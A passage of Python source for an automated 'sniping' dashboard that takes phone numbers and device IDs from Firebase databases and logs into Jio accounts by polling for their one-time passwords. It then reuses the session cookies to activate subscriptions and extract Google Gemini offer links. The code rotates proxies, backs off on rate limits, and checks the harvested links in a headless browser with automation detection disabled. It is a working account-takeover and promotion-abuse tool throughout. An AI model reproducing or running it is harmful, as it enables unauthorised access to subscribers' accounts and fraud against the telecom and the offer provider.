                    aiohttp.ClientResponseError, aiohttp.ClientHttpProxyError,
                    ConnectionError, OSError) as conn_err:
                raise ProxyError(f"Proxy failed during validateOtp: {conn_err}")

            if attempt == 1:
                state.stats["login"] += 1
                record_analytics_event("FirebaseDirect", "login")
                await emit_stats()

            # Build full cookie string for OTT API calls
            full_cookie_str = "; ".join(f"{k}={v}" for k, v in raw_cookies.items())

            # 4. CLAIM OFFER — Using full cookie string (proven to work)
            order_event(order, "Claiming Gemini offer...")
            await emit_order(order)

            target_link = None

            # Build headers with manual Cookie (cookie_jar misses critical HttpOnly cookies)
            claim_headers = {
                "user-agent": session.headers.get("user-agent", ""),
                "accept": "application/json, text/plain, */*",
                "referer": "https://www.jio.com/selfcare/googleai/?header=no&type=Z0241&source=JIO",
                "origin": "https://www.jio.com",
                "Cookie": full_cookie_str,
            }

            # Step 1: Activate subscription (required before google-ai)
            activate_status = None
            activate_msg = ""
            # Reuse one session for all claim steps (they're all stateless, headers passed per-request)
            async with aiohttp.ClientSession() as claim_session:
                try:
                    act_url = "https://www.jio.com/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
                    async with claim_session.get(act_url, proxy=proxy, timeout=15, headers=claim_headers) as act_resp:
                        act_body = await act_resp.text()
                        await emit_log(f"[{phone}] activate → {act_resp.status}: {act_body[:200]}", "info")
                        activate_status = act_resp.status
                        try:
                            act_data = json.loads(act_body)
                            activate_msg = act_data.get("errorMessage", "") or act_data.get("responseMessage", "")
                        except:
                            activate_msg = act_body[:100]
                except Exception as e:
                    await emit_log(f"[{phone}] activate error (continuing): {e}", "warning")

                await asyncio.sleep(0.3 * speed_delay)

                # Step 2: Get Google AI redirect URL (this is where the link lives)
                gai_status = None
                gai_msg = ""
                try:
                    gai_url = "https://www.jio.com/api/jio-ott-service/ott/subscription/google-ai"
                    async with claim_session.get(gai_url, proxy=proxy, timeout=15, headers=claim_headers) as gai_resp:
                        gai_body = await gai_resp.text()
                        gai_status = gai_resp.status
                        await emit_log(f"[{phone}] google-ai → {gai_resp.status}: {gai_body[:200]}", "info")
                        if gai_resp.status == 200:
                            try:
                                gai_data = await gai_resp.json(content_type=None)
                                gai_msg = gai_data.get("errorMessage", "") or gai_data.get("responseMessage", "")
                                # The key is 'redirectionURL' (proven by dry run)
                                for key in ("redirectionURL", "redirectUrl", "url", "link", "redirect_url", "googleUrl", "activationUrl"):
                                    val = gai_data.get(key)
                                    if val and is_google_link(str(val)):
                                        target_link = str(val)
                                        await emit_log(f"[{phone}] 🎯 Found link in '{key}'!", "success")
                                        break
                            except:
                                pass
                        else:
                            try:
                                gai_data = json.loads(gai_body)
                                gai_msg = gai_data.get("errorMessage", "") or gai_data.get("responseMessage", "")
                            except:
                                gai_msg = gai_body[:100]
                        # Search raw body as fallback
                        if not target_link:
                            found = find_google_link_in_text(gai_body)
                            if found:
                                target_link = found
                                await emit_log(f"[{phone}] 🎯 Found link in response body!", "success")
                except (aiohttp.ClientConnectorError, aiohttp.ClientOSError, aiohttp.ServerDisconnectedError,
                        aiohttp.ClientResponseError, aiohttp.ClientHttpProxyError,
                        ConnectionError, OSError) as conn_err:
                    raise ProxyError(f"Proxy failed on google-ai (OTP was valid!): {conn_err}")

                # Step 3: Fallback — try submit endpoint
                if not target_link:
                    await asyncio.sleep(0.3 * speed_delay)
                    try:
                        submit_url = "https://www.jio.com/api/jio-ott-service/ott/subscription/submit"
                        async with claim_session.get(submit_url, proxy=proxy, timeout=15, headers=claim_headers, allow_redirects=False) as sub_resp:
                            sub_body = await sub_resp.text()
                            await emit_log(f"[{phone}] submit → {sub_resp.status}: {sub_body[:200]}", "info")
                            if sub_resp.status in [301, 302, 303, 307]:
                                loc = sub_resp.headers.get("Location", "")
                                if is_google_link(loc):
                                    target_link = loc
                            elif sub_resp.status == 200:
                                try:
                                    data = await sub_resp.json(content_type=None)
                                    for key in ("redirectionURL", "redirectUrl", "url", "link"):
                                        val = data.get(key)
                                        if val and is_google_link(str(val)):
                                            target_link = str(val)
                                            break
                                except:
                                    found = find_google_link_in_text(sub_body)
                                    if found: target_link = found
                    except Exception as e:
                        await emit_log(f"[{phone}] submit error: {e}", "warning")

            if not target_link or not is_google_link(target_link):
                # Determine the specific reason for failure
                if activate_status == 401 or gai_status == 401:
                    alt_offer = "Auth Failed (401)"
                elif gai_status == 200 and gai_msg.upper() == "SUCCESS" and not target_link:
                    alt_offer = "No Gemini Offer (API succeeded but no link)"
                elif activate_msg and "no" in activate_msg.lower() and "subscription" in activate_msg.lower():
                    alt_offer = f"No Subscription: {activate_msg}"
                elif gai_msg:
                    alt_offer = f"API Response: {gai_msg}"
                elif activate_msg:
                    alt_offer = f"Activate Response: {activate_msg}"
                else:
                    alt_offer = "Unknown Alternative Offer or No Offer"

                await emit_log(f"ℹ️ [{phone}] {alt_offer}", "info")
                order_event(order, f"Result: {alt_offer}")
                with open(os.path.join(DATA_DIR, "alternative_offers.csv"), "a", newline="") as f:
                    csv.writer(f).writerow([fb_url, device_id, phone, alt_offer])
                order["status"] = "cancelled"
                await emit_order(order)
                with open(used_file, "a") as f:
                    f.write(device_id + "\n")
                state.batch_checked += 1
                await emit_batch_progress()
                return

            # Success!
            # Persist link to config["saved_links"] — survives Railway restarts/redeploys
            saved_links = config.get("saved_links", [])
            if target_link not in saved_links:
                saved_links.append(target_link)
                config["saved_links"] = saved_links
                save_config(config)

            # Also write to CSV and links.txt as backup
            try:
                with open(SUCCESS_CSV, "a", newline="") as f:
                    csv.writer(f).writerow([fb_url, device_id, phone, target_link, online_status, otp_wait_time])
                with open(os.path.join(DATA_DIR, "links.txt"), "a") as f:
                    f.write(f"{phone} | {target_link}\n")
            except Exception:
                pass

            # Mark device as used
            with open(used_file, "a") as f:
                f.write(device_id + "\n")
            state.batch_checked += 1
            await emit_batch_progress()

            order["status"] = "logged_in"
            order_event(order, "✅ Link extracted & saved!")
            await emit_order(order)
            await emit_log(f"🎉 [{phone}] Gemini Link Saved! ", "success")

            # Emit link_saved so frontend Links tab updates in real-time
            link_count = 0
            if os.path.exists(SUCCESS_CSV):
                try:
                    with open(SUCCESS_CSV, "r") as f:
                        link_count = sum(1 for _ in csv.reader(f))
                except Exception:
                    pass
            await sio.emit("link_saved", {
                "phone": "+91" + clean_phone,
                "link": target_link,
                "count": link_count
            })
            return

    except RetryableJioError as e:
        state.global_jio_pause_until = time.time() + 60  # 60s global pause on 429
        if attempt < max_attempts:
            retry_delay = random.randint(90, 150)
            await emit_log(f"⚠️ [{phone}] API Error: {e} — pausing queue for 5s, retrying this in {retry_delay}s (attempt {attempt}/{max_attempts})", "warning")
            order["status"] = "cancelled"
            order_event(order, f"API Error: {e} — retry scheduled in {retry_delay}s")
            await emit_order(order)
            asyncio.create_task(_delayed_retry(device_id, phone, fb_url, speed_delay, attempt + 1, retry_delay, online_status))
        else:
            await emit_log(f"❌ [{phone}] API Error: {e} — all {max_attempts} attempts exhausted", "error")
            order["status"] = "cancelled"
            order_event(order, f"API Error: {e} — gave up after {max_attempts} attempts")
            await emit_order(order)
            with open(FAILED_CSV, "a", newline="") as f:
                csv.writer(f).writerow([fb_url, device_id, phone, f"API Error: {e} (exhausted)", online_status, otp_wait_time])
            with open(used_file, "a") as f:
                f.write(device_id + "\n")
            state.batch_checked += 1
            await emit_batch_progress()
        return

    except ProxyError as e:
        error_str = str(e).lower()
        is_critical = any(x in error_str for x in [
            "429", "407", "too many", "auth", "authorization", "forbidden",
            "network is unreachable", "name resolution", "connect call failed",
            "no route to host", "connection refused", "dns",
        ])

        if is_critical:
            # Critical proxy error — auto-pause the system, don't waste more numbers
            order["status"] = "cancelled"
            order_event(order, f"⚠️ Proxy error: {e} — AUTO-PAUSED")
            await emit_order(order)
            # Do NOT write to used_firebase_devices.txt — this device should be retried after fix

            # Auto-pause the system
            if not state.pause_event:
                state.pause_event = asyncio.Event()
            if not state.pause_event.is_set():
                state.pause_event.set()
                state.pause_reason = str(e)
                await emit_log(f"🚨 AUTO-PAUSED: {e}. Fix your proxy and click Resume.", "error")
                await sio.emit("sniping_paused", {"reason": str(e)})
            return

        # Non-critical proxy error — retry with a different proxy (up to 3 times)
        proxy_attempts = order.get('_proxy_retries', 0) + 1
        if proxy_attempts <= 3:
            order['_proxy_retries'] = proxy_attempts
            new_proxy = get_random_proxy()
            proxy_label = f" via new proxy" if new_proxy else " direct"
            await emit_log(f"🔄 [{phone}] Proxy error: {e} — retrying{proxy_label} (proxy attempt {proxy_attempts}/3)", "warning")
            order["status"] = "waiting_otp"
            order_event(order, f"Proxy failed, retrying{proxy_label}...")
            await emit_order(order)
            # Small delay then retry same attempt number (proxy issue, not Jio issue)
            await asyncio.sleep(2)
            asyncio.create_task(process_firebase_number(device_id, phone, fb_url, speed_delay, attempt=attempt, online_status=online_status))
        else:
            await emit_log(f"❌ [{phone}] All 3 proxies failed: {e}", "error")
            order["status"] = "cancelled"
            order_event(order, f"All proxies failed: {e}")
            await emit_order(order)
            with open(FAILED_CSV, "a", newline="") as f:
                csv.writer(f).writerow([fb_url, device_id, phone, f"Proxy Error: {e} (3 proxies tried)", online_status, otp_wait_time])
            with open(used_file, "a") as f:
                f.write(device_id + "\n")
            state.batch_checked += 1
            await emit_batch_progress()
        return

    except Exception as e:
        err_msg = str(e).split('\n')[0]
        err_lower = err_msg.lower()

        # Detect internet connectivity loss — auto-pause instead of wasting devices
        is_network_down = any(x in err_lower for x in [
            "network is unreachable", "name resolution", "connect call failed",
            "no route to host", "cannot connect to host", "dns",
        ])

        if is_network_down:
            order["status"] = "cancelled"
            order_event(order, f"⚠️ Network error: {err_msg} — AUTO-PAUSED")
            await emit_order(order)
            # Do NOT mark device as used — retry after internet is back
            if not state.pause_event:
                state.pause_event = asyncio.Event()
            if not state.pause_event.is_set():
                state.pause_event.set()
                state.pause_reason = f"Network down: {err_msg}"
                await emit_log(f"🚨 AUTO-PAUSED: Internet appears down — {err_msg}. Resume when connection is back.", "error")
                await sio.emit("sniping_paused", {"reason": f"Network down: {err_msg}"})
            return

        order["status"] = "cancelled"
        order_event(order, f"API Error: {err_msg}")
        await emit_order(order)
        await emit_log(f"[{phone}] Error: {err_msg}", "error")
        with open(FAILED_CSV, "a", newline="") as f:
            csv.writer(f).writerow([fb_url, device_id, phone, err_msg, online_status, otp_wait_time])
        with open(used_file, "a") as f:
            f.write(device_id + "\n")
        state.batch_checked += 1
        await emit_batch_progress()

    finally:
        try:
            if 'slot_timer' in locals() and slot_timer and not slot_timer.done():
                slot_timer.cancel()
        except Exception:
            pass

        if not slot_released:
            async with _jio_lock():
                state.jio_count = max(0, state.jio_count - 1)

        # Clean up order from state.orders to prevent memory leak
        # (Firebase orders were never deleted, accumulating hundreds over hours)
        if 'order_id' in locals() and order_id in state.orders:
            await asyncio.sleep(5)  # Brief delay so UI can show final status
            if order_id in state.orders:
                del state.orders[order_id]
                await sio.emit("number_remove", {"id": order_id})


def _jio_lock():
    """Lazy-init asyncio.Lock for jio_count safety."""
    if state.jio_count_lock is None:
        state.jio_count_lock = asyncio.Lock()
    return state.jio_count_lock

def _otp_lock():
    """Lazy-init asyncio.Lock for OTP click throttling."""
    if state.otp_click_lock is None:
        state.otp_click_lock = asyncio.Lock()
    return state.otp_click_lock


async def _delayed_retry(device_id, phone, fb_url, speed_delay, attempt, delay_seconds, online_status):
    """Wait for delay_seconds, then re-run process_firebase_number with incremented attempt."""
    await asyncio.sleep(delay_seconds)

    # Firebase retries are pure HTTP — no browser stagger needed

    async with _jio_lock():
        state.jio_count += 1

    await emit_log(f"🔄 [{phone}] Retrying now (attempt {attempt})...", "info")
    await process_firebase_number(device_id, phone, fb_url, speed_delay, attempt=attempt, online_status=online_status)


async def firebase_sniper_worker(speed_delay, scan_mode="deep"):
    init_csvs()

    # Check if we're resuming from a pause (skip scan, restore saved queue)
    if state.saved_devices and state.saved_device_map:
        available_devices = state.saved_devices
        device_map = state.saved_device_map
        state.saved_devices = []
        state.saved_device_map = {}
        await emit_log(f"▶ Resuming from pause — {len(available_devices)} devices remaining (no re-scan needed)", "success")
    else:
        # Sequential DB mode: process each Firebase DB one by one
        # Build per-db list from firebase_dbs config (URL+Key pairs)
        firebase_dbs = config.get("firebase_dbs", [])
        if not firebase_dbs:
            # fallback to firebase_urls list (no key)
            firebase_dbs = [{"url": u, "key": ""} for u in config.get("firebase_urls", [])]

        if not firebase_dbs:
            await emit_log("No Firebase databases configured!", "error")
            return

        used_file = os.path.join(DATA_DIR, "used_firebase_devices.txt")
        used_devices = set()
        if os.path.exists(used_file):
            with open(used_file, "r") as f:
                used_devices = set(line.strip() for line in f if line.strip())

        # Scan ALL databases first, then process sequentially per-db
        device_map = await fetch_initial_mapping(scan_mode=scan_mode)
        if not device_map: return

        # Group devices by their source Firebase URL (sequential order)
        db_urls_ordered = []
        seen = set()
        for db in firebase_dbs:
            url = clean_firebase_url((db.get("url") or "").strip())
            if url and url not in seen:
                db_urls_ordered.append(url)
                seen.add(url)

        # Build available_devices ordered: all devices from db1, then db2, etc.
        available_devices = []
        for db_url in db_urls_ordered:
            db_devices = [k for k, v in device_map.items()
                          if v.get("url") == db_url and k not in used_devices]
            if db_devices:
                await emit_log(f"📦 [{db_url.split('//')[1].split('.')[0]}] {len(db_devices)} devices queued", "info")
            available_devices.extend(db_devices)
        # Add any remaining devices not matched by URL order
        matched = set(available_devices)
        for k in device_map:
            if k not in matched and k not in used_devices:
                available_devices.append(k)

    await emit_log(f"Firebase: {len(available_devices)} devices available (using HTTP polling for OTP)", "info")

    state.batch_total = len(available_devices)
    state.batch_checked = 0
    state.batch_start_time = time.time()
    await emit_batch_progress()

    # Initialize pause_event (clear = not paused = running)
    if not state.pause_event:
        state.pause_event = asyncio.Event()

    while not state.stop_event.is_set() and available_devices:
        # Check if paused — sleep until resumed or stopped
        if state.pause_event.is_set():
            # Save state so resume can pick up exactly here
            state.saved_devices = available_devices
            state.saved_device_map = device_map
            await emit_log(f"⏸ Paused with {len(available_devices)} devices remaining. Click Resume to continue.", "warn")
            while state.pause_event.is_set() and not state.stop_event.is_set():
                await asyncio.sleep(2)
            if state.stop_event.is_set():
                break
            # Restored from pause — continue the loop
            await emit_log(f"▶ Resumed! Continuing with {len(available_devices)} devices...", "success")

        # Firebase is pure HTTP — no browser stagger needed.
        # OTP_CLICK_INTERVAL (OTP Delay) is the sole pacing mechanism.

        if time.time() < getattr(state, "global_jio_pause_until", 0):
            await asyncio.sleep(2)
            continue

        device_id = available_devices.pop(0)

        # Log DB transition when switching to a new Firebase database
        current_fb_url = device_map[device_id]["url"]
        if not hasattr(state, "_last_fb_url"):
            state._last_fb_url = None
        if state._last_fb_url and state._last_fb_url != current_fb_url:
            db_name = current_fb_url.split("//")[1].split(".")[0] if "//" in current_fb_url else current_fb_url
            await emit_log(f"📦 Switched to next Firebase DB: {db_name}", "info")
        state._last_fb_url = current_fb_url

        phone = device_map[device_id]["phone"]
        fb_url = device_map[device_id]["url"]
        online_status = device_map[device_id].get("status", "unknown")
        cached_keys = device_map[device_id].get("cached_keys", None)

        # Free cached_keys from device_map after extracting — prevents millions of strings in RAM
        device_map[device_id]["cached_keys"] = None

        async with _jio_lock():
            state.jio_count += 1
        asyncio.create_task(process_firebase_number(device_id, phone, fb_url, speed_delay, online_status=online_status, cached_msg_keys=cached_keys))
        await asyncio.sleep(OTP_CLICK_INTERVAL)

    # All devices dispatched — wait for in-flight tasks to finish
    if not state.stop_event.is_set():
        await emit_log(f"All {len(device_map)} Firebase devices dispatched. Waiting for in-flight tasks...", "info")
        while state.jio_count > 0 and not state.stop_event.is_set():
            await asyncio.sleep(2)

        await emit_log("✅ Firebase Direct completed — all devices processed!", "success")

# ─── Sniper Workers ──────────────────────────────────────────────────────────
async def sniper_worker(p_name, speed_delay):
    delay = config["providers"].get(p_name, {}).get("delay", 3) * speed_delay

    while not state.stop_event.is_set():
        if state.jio_count >= state.target_count:
            await asyncio.sleep(delay)
            continue

        state.jio_count += 1
        try:
            result = await buy_number(p_name)
            if result["status"] == "success":
                asyncio.create_task(process_number(p_name, result["aid"], result["phone"]))
            else:
                state.jio_count -= 1
        except:
            state.jio_count -= 1
        await asyncio.sleep(delay)

# ─── Socket.IO Events ────────────────────────────────────────────────────────
@sio.on('connect')
async def on_connect(sid, environ):
    await emit_log("Dashboard connected", "info")

    # Sync current state to prevent "factory reset" on browser reload
    if state.is_sniping:
        await sio.emit('sniping_started', to=sid)
        # If paused, also send pause state so UI shows Resume button
        if state.pause_event and state.pause_event.is_set():
            await sio.emit('sniping_paused', {"reason": state.pause_reason or "Paused"}, to=sid)

    await emit_stats()
    await emit_batch_progress()

    for order in state.orders.values():
        await sio.emit("number_update", safe_order(order), to=sid)

    # Start system monitor if not running
    if state.system_monitor_task is None or state.system_monitor_task.done():
        state.system_monitor_task = asyncio.create_task(system_monitor_loop())

@sio.on('get_balances')
async def on_get_balances(sid):
    if not state.http_session:
        state.http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, enable_cleanup_closed=True))
    balances = {}
    for p in config["providers"]:
        bal = await get_balance(p)
        balances[p] = bal
    await sio.emit("balance_update", balances, to=sid)

@sio.on('start_sniping')
async def on_start_sniping(sid, data):
    if state.is_sniping:
        await emit_log("Already sniping!", "warn")
        return

    providers = data.get("providers", list(config["providers"].keys()))
    state.target_count = data.get("batch_size", 5)
    speed = data.get("speed", "normal")
    speed_delay = SPEED_MAP.get(speed, 1.0)

    state.is_sniping = True
    state.stop_event = asyncio.Event()
    state.jio_count = 0
    state.stats = {"fetched": 0, "jio": 0, "otp": 0, "login": 0, "otp_times": []}

    # Record session start
    analytics.setdefault("sessions", []).append({
        "start": time.time(), "providers": providers, "target": state.target_count
    })

    if not state.http_session:
        state.http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, enable_cleanup_closed=True))

    if "otp_delay" in data:
        global BROWSER_LAUNCH_INTERVAL, OTP_CLICK_INTERVAL
        BROWSER_LAUNCH_INTERVAL = int(data["otp_delay"])
        OTP_CLICK_INTERVAL = int(data["otp_delay"])

    os.makedirs(PROFILES_DIR, exist_ok=True)

    # Only launch browser if we have non-Firebase providers (Firebase uses pure HTTP)
    needs_browser = any(p != "FirebaseDirect" for p in providers)

    if needs_browser:
        try:
            from playwright.async_api import async_playwright
            headless_val = data.get("headless")
            if headless_val is None:
                is_headless = str(os.environ.get("HEADLESS_MODE", "False")).lower() == "true"
            else:
                is_headless = str(headless_val).lower() == "true"

            # Clean up existing browser so new headless setting applies and RAM is freed
            if state.browser:
                try: await state.browser.close()
                except: pass
                state.browser = None
            if state.pw:
                try: await state.pw.stop()
                except: pass
                state.pw = None

            state.pw = await async_playwright().start()
            state.browser = await state.pw.chromium.launch(headless=is_headless)
            mode_str = "Headless Mode" if is_headless else "Visible GUI Mode"
            await emit_log(f"Browser launched in {mode_str}", "info")
        except Exception as e:
            await emit_log(f"Browser launch failed: {e}. OTP-only mode.", "warn")
    else:
        # Firebase-only mode — no browser needed, pure HTTP
        if state.browser:
            try: await state.browser.close()
            except: pass
            state.browser = None
        if state.pw:
            try: await state.pw.stop()
            except: pass
            state.pw = None
        await emit_log("🚀 Firebase-only mode — no browser needed (pure HTTP)", "info")

    await sio.emit("sniping_started")
    await emit_log(f"🚀 Sniping started! Providers: {', '.join(providers)} | Target: {state.target_count}", "success")
    state.sniper_tasks = []
    for p in providers:
        if p == "FirebaseDirect":
            scan_mode = data.get("scan_mode", "deep")
            # Backward compat: if old client sends deep_scan bool
            if "deep_scan" in data and "scan_mode" not in data:
                scan_mode = "deep" if data["deep_scan"] else "normal"
            state.sniper_tasks.append(asyncio.create_task(firebase_sniper_worker(speed_delay, scan_mode=scan_mode)))
        elif p in config["providers"]:
            state.sniper_tasks.append(asyncio.create_task(sniper_worker(p, speed_delay)))

# ─── Link Checker ─────────────────────────────────────────────────────────────
LINK_CHECKER_PROFILE = os.path.join(DATA_DIR, "google_checker_profile")
VALID_INDICATORS = [
    "activate your plan", "accept and continue", "start your", "claim your",
    "get started", "activate plan", "confirm your", "redeem",
    "subscription included", "included with your plan", "google one",
]
USED_INDICATORS = [
    "already been redeemed", "already redeemed", "already been used",
    "already used", "already claimed", "already activated",
    "this link has expired", "expired", "no longer available",
    "not available", "code is invalid", "invalid code",
    "something went wrong", "can't be redeemed", "cannot be redeemed",
]

link_check_stop = None

@sio.on('check_links')
async def on_check_links(sid, data):
    global link_check_stop
    link_check_stop = asyncio.Event()

    links = data.get("links", [])
    use_csv = data.get("use_csv", False)

    # Load from CSV if no links provided
    if use_csv or not links:
        csv_path = os.path.join(DATA_DIR, "extracted_links.csv")
        if os.path.exists(csv_path):
            with open(csv_path, "r") as f:
                for row in csv.reader(f):
                    if len(row) >= 4 and row[3].startswith("http"):
                        links.append(row[3])
        await sio.emit("link_check_log", {"msg": f"Loaded {len(links)} links from extracted_links.csv", "level": "info"}, to=sid)

    if not links:
        await sio.emit("link_check_log", {"msg": "❌ No links to check!", "level": "ERROR"}, to=sid)
        await sio.emit("link_check_done", {"valid": 0, "used": 0, "errors": 0}, to=sid)
        return

    # Deduplicate
    links = list(dict.fromkeys(links))
    await sio.emit("link_check_total", {"total": len(links)}, to=sid)
    await sio.emit("link_check_log", {"msg": f"🔍 Checking {len(links)} links...", "level": "info"}, to=sid)

    # Check profile exists
    if not os.path.exists(LINK_CHECKER_PROFILE):
        await sio.emit("link_check_log", {"msg": "❌ No Google login found! Run: python3 scripts/check_links.py --login", "level": "ERROR"}, to=sid)
        await sio.emit("link_check_done", {"valid": 0, "used": 0, "errors": 0}, to=sid)
        return

    stats = {"valid": 0, "used": 0, "errors": 0}

    try:
        from playwright.async_api import async_playwright
        pw = await async_playwright().start()
        context = await pw.chromium.launch_persistent_context(
            LINK_CHECKER_PROFILE,
            headless=True,
            args=["--disable-blink-features=AutomationControlled"],
            viewport={"width": 1280, "height": 800},
        )

        # Check login state first on one page
        page = context.pages[0] if context.pages else await context.new_page()
        await page.goto("https://myaccount.google.com/", wait_until="domcontentloaded", timeout=15000)
        await asyncio.sleep(1)
        if "accounts.google.com" in page.url:
            await sio.emit("link_check_log", {"msg": "❌ Not logged in! Run: python3 scripts/check_links.py --login", "level": "ERROR"}, to=sid)
            await sio.emit("link_check_done", stats, to=sid)
            await context.close()
            await pw.stop()
            return

        await page.close() # close test page

        # Concurrency control (e.g. 5 tabs at once)
        sem = asyncio.Semaphore(5)

        async def check_single_link(i, link):
            if link_check_stop.is_set():
                return

            async with sem:
                page = await context.new_page()
                short = link[:70] + "..."
                try:
                    await page.goto(link, wait_until="domcontentloaded", timeout=20000)
                    await asyncio.sleep(1.5)  # Let dynamic text render

                    final_url = page.url
                    if "accounts.google.com" in final_url:
                        await sio.emit("link_check_log", {"msg": f"🔒 [{i+1}] Login expired on this tab!", "level": "ERROR"}, to=sid)
                        stats["errors"] += 1
                        await sio.emit("link_check_result", {"link": link, "status": "ERROR"}, to=sid)
                        await page.close()
                        return

                    body_text = ""
                    try: body_text = (await page.inner_text("body")).lower()
                    except: pass

                    status = "UNKNOWN"
                    detail = ""

                    for ind in USED_INDICATORS:
                        if ind in body_text:
                            status = "USED"
                            detail = ind
                            break
                    if status == "UNKNOWN":
                        for ind in VALID_INDICATORS:
                            if ind in body_text:
                                status = "VALID"
                                detail = ind
                                break

                    icon = {"VALID": "✅", "USED": "❌", "UNKNOWN": "❓"}.get(status, "?")
                    await sio.emit("link_check_log", {"msg": f"{icon} [{i+1}/{len(links)}] {status} — {short}", "level": status}, to=sid)
                    await sio.emit("link_check_result", {"link": link, "status": status, "detail": detail}, to=sid)

                    if status == "VALID": stats["valid"] += 1
                    elif status == "USED": stats["used"] += 1
                    else: stats["errors"] += 1

                except Exception as e:
                    await sio.emit("link_check_log", {"msg": f"⚠️ [{i+1}/{len(links)}] Error: {str(e)[:60]}", "level": "ERROR"}, to=sid)
                    await sio.emit("link_check_result", {"link": link, "status": "ERROR"}, to=sid)
                    stats["errors"] += 1
                finally:
                    await page.close()

        # Launch all tasks concurrently (semaphore handles max 5 active)
        tasks = [asyncio.create_task(check_single_link(i, link)) for i, link in enumerate(links)]
        await asyncio.gather(*tasks)

        await context.close()
        await pw.stop()

    except Exception as e:
        await sio.emit("link_check_log", {"msg": f"❌ Browser error: {e}", "level": "ERROR"}, to=sid)

    await sio.emit("link_check_done", stats, to=sid)

@sio.on('stop_link_check')
async def on_stop_link_check(sid):
    global link_check_stop
    if link_check_stop:
        link_check_stop.set()

@sio.on('pause_sniping')
async def on_pause_sniping(sid):
    if not state.is_sniping:
        return
    if state.pause_event and state.pause_event.is_set():
        await emit_log("Already paused!", "warn")
        return
    if not state.pause_event:
        state.pause_event = asyncio.Event()
    state.pause_event.set()  # Signal the worker loop to pause
    state.pause_reason = "Manual pause"
    await emit_log("⏸ Pausing... in-flight tasks will finish, no new devices will be dispatched.", "warn")
    await sio.emit("sniping_paused", {"reason": "Manual pause"})

@sio.on('resume_sniping')
async def on_resume_sniping(sid):
    if not state.is_sniping:
        # Resuming after full pause — need to restart the worker with saved state
        if state.saved_devices and state.saved_device_map:
            state.is_sniping = True
            state.stop_event = asyncio.Event()
            state.pause_event = asyncio.Event()  # clear = not paused
            state.pause_reason = ""
            if not state.http_session:
                state.http_session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=30, limit_per_host=10, enable_cleanup_closed=True))

            speed_delay = SPEED_MAP.get("normal", 1.0)
            task = asyncio.create_task(firebase_sniper_worker(speed_delay, scan_mode="deep"))
            state.sniper_tasks = [task]

            await sio.emit("sniping_started")
            await sio.emit("sniping_resumed")
            await emit_log(f"▶ Resuming with {len(state.saved_devices)} devices remaining!", "success")
        else:
            await emit_log("Nothing to resume — no saved state. Start a new session.", "warn")
        return

    if state.pause_event:
        state.pause_event.clear()  # Unset = running
    state.pause_reason = ""
    await sio.emit("sniping_resumed")
    await emit_log("▶ Resumed!", "success")

@sio.on('stop_sniping')
async def on_stop_sniping(sid):
    if state.stop_event:
        state.stop_event.set()
    # Clear pause so the loop can exit
    if state.pause_event:
        state.pause_event.clear()
    # Clear saved state — stop means FULL RESET, next start requires fresh deep scan
    state.saved_devices = []
    state.saved_device_map = {}
    state.pause_reason = ""
    await emit_log("⏳ Stopping... letting active tasks finish. Next start will require a fresh scan.", "warn")

    # Wait for tasks to finish in background
    async def monitor_tasks():
        if state.sniper_tasks:
            await asyncio.gather(*state.sniper_tasks, return_exceptions=True)
        state.sniper_tasks = []
        state.is_sniping = False
        save_analytics()
        await sio.emit("sniping_stopped")
        await emit_log("⏹ All tasks completed. Sniping stopped.", "warn")

    asyncio.create_task(monitor_tasks())

@sio.on('force_stop_sniping')
async def on_force_stop_sniping(sid):
    if state.stop_event:
        state.stop_event.set()
    if state.pause_event:
        state.pause_event.clear()
    # Clear saved state — force stop = full reset
    state.saved_devices = []
    state.saved_device_map = {}
    state.pause_reason = ""
    for task in state.sniper_tasks:
        task.cancel()
    state.sniper_tasks = []
    state.is_sniping = False
    save_analytics()
    await sio.emit("sniping_stopped")
    await emit_log("✖ FORCE STOPPED. All tasks killed instantly.", "error")

@sio.on('kill_zombie_browsers')
async def on_kill_zombie_browsers(sid):
    await emit_log("🧹 Killing zombie Google Chrome for Testing processes...", "warn")
    os.system('pkill -f "Google Chrome for Testing" >/dev/null 2>&1 || true')
    await emit_log("✅ Zombie browsers cleared!", "success")

@sio.on('cancel_number')
async def on_cancel_number(sid, data):
    order_id = data.get("id")
    order = state.orders.get(order_id)
    if not order:
        return
    ctx = order.get("_context")
    if ctx:
        try:
            await ctx.close()
        except:
            pass
        order["_context"] = None
    order_event(order, "Manually cancelled by user")
    asyncio.create_task(cancel_order(order))
    await emit_log(f"Cancelling {order['phone']}...", "warn")

@sio.on('request_new_otp')
async def on_request_new_otp(sid, data):
    order_id = data.get("id")
    order = state.orders.get(order_id)
    if not order:
        return
    order["status"] = "waiting_otp"
    order["otp"] = None
    order_event(order, "Re-polling for new OTP...")
    await emit_order(order)
    await emit_log(f"Re-polling OTP for {order['phone']}...", "info")
    asyncio.create_task(handle_jio_number(order))

@sio.on('force_cancel')
async def on_force_cancel(sid, data):
    order_id = data.get("id")
    order = state.orders.get(order_id)
    if not order:
        return
    ctx = order.get("_context")
    if ctx:
        try:
            await ctx.close()
        except:
            pass
        order["_context"] = None
    order_event(order, "Force cancelled — skipping wait timer")
    order["status"] = "cancelling"
    await emit_order(order)
    # Force cancel immediately (no 120s wait)
    status = await cancel_api_number(order["provider"], order["aid"])
    order["status"] = "cancelled"
    order_event(order, f"Force cancel result: {status}")
    await emit_order(order)
    await emit_log(f"[{order['phone']}] Force cancelled: {status}", "warn")
    await asyncio.sleep(3)
    if order_id in state.orders:
        del state.orders[order_id]
        await sio.emit("number_remove", {"id": order_id})

@sio.on('get_orders')
async def on_get_orders(sid):
    for order in state.orders.values():
        await sio.emit("number_update", safe_order(order), to=sid)

@sio.on('get_settings')
async def on_get_settings(sid):
    await sio.emit("settings_data", config, to=sid)

@sio.on('save_settings')
async def on_save_settings(sid, data):
    global config
    config.update(data)
    save_config(config)
    await emit_log("⚙️ Settings saved!", "success")
    await sio.emit("settings_saved")

@sio.on('get_analytics')
async def on_get_analytics(sid):
    await sio.emit("analytics_data", analytics, to=sid)

@sio.on('get_order_detail')
async def on_get_order_detail(sid, data):
    order_id = data.get("id")
    order = state.orders.get(order_id)
    if order:
        await sio.emit("order_detail", safe_order(order), to=sid)

@sio.on('stop_omkar_generation')
async def on_stop_omkar_generation(sid):
    state.omkar_gen_stop = True
    await sio.emit('omkar_gen_log', {'msg': 'Stopping generation after current step...', 'level': 'warn'}, to=sid)

@sio.on('generate_omkar_keys')
